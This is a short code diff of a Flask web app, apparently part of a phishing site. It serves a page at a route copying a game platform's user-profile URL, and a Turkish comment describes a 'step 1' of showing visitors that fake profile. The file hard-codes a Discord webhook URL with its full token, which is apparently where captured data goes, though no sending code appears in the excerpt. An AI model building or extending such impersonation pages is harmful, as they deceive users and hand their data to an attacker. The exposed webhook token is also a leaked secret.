@@ -8,7 +8,7 @@ app = Flask(__name__)
 DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1389197903364362334/PDjw-rxZ1n2OIT2tmMoObfMQtznuhrUT5evwUayhIpz1YAaEnUU_psuI0_SepNCdP29k"
 
 # 1. ADIM: Kullanıcı siteye ilk girdiğinde PROFİL sayfasını görsün
-@app.route('/users/9325970578/profile?friendshipSourceType=PlayerSearch')
+@app.route('/users/9325970578/profile')
 def home():
     return render_template('profil.html')
 
